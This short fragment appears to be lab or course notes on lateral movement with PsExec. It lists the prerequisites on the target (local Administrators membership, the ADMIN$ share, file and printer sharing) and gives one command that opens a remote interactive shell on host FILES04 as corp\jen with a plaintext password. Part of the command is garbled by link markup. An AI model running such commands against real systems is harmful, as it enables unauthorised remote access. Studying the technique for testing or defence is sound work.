
1.  The user authenticating to the target needs to be in the Administrators local group.
2. The ADMIN$ share must be available.
3. File and printer sharing needs to be turned on.

./PsExec64.exe -i  [\\FILES04 -u corp\jen](file://FILES04%20-u%20corp/jen) -p Nexus123! cmd